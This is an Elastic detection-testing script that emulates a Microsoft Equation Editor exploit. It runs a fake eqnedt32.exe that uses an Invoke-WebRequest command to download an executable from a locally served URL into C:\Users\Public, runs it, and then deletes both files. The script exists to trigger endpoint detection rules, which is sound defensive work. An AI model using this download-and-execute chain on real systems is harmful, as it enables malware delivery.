# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="a0b7435a-1f48-4fae-b3dc-c596dc70490d",
    platforms=["windows"],
    endpoint=[
        {
            "rule_name": "Execution of File Written or Modified by Microsoft Equation Editor",
            "rule_id": "8bc4f22c-9bb1-4c76-a7b6-195bee3579db",
        },
        {"rule_name": "Microsoft Equation Editor Child Process", "rule_id": "60eb5960-b26e-494a-8cf2-35ab5939f6c1"},
    ],
    siem=[],
    techniques=["T1203", "T1566"],
)

EXE_FILE = common.get_path("bin", "renamed_posh.exe")


@common.requires_os(metadata.platforms)
def main():
    server, ip, port = common.serve_web()
    url = f"http://{ip}:{port}/bin/renamed_posh.exe"

    eqnedt32 = "C:\\Users\\Public\\eqnedt32.exe"
    dropped = "C:\\Users\\Public\\posh.exe"
    common.copy_file(EXE_FILE, eqnedt32)

    cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"

    # Execute command
    common.log("Using a fake eqnedt32 to drop and execute an .exe")
    common.execute([eqnedt32, "/c", cmd], timeout=10)
    common.execute([eqnedt32, "/c", dropped], timeout=10, kill=True)
    common.remove_file(eqnedt32)
    common.remove_file(dropped)


if __name__ == "__main__":
    exit(main())
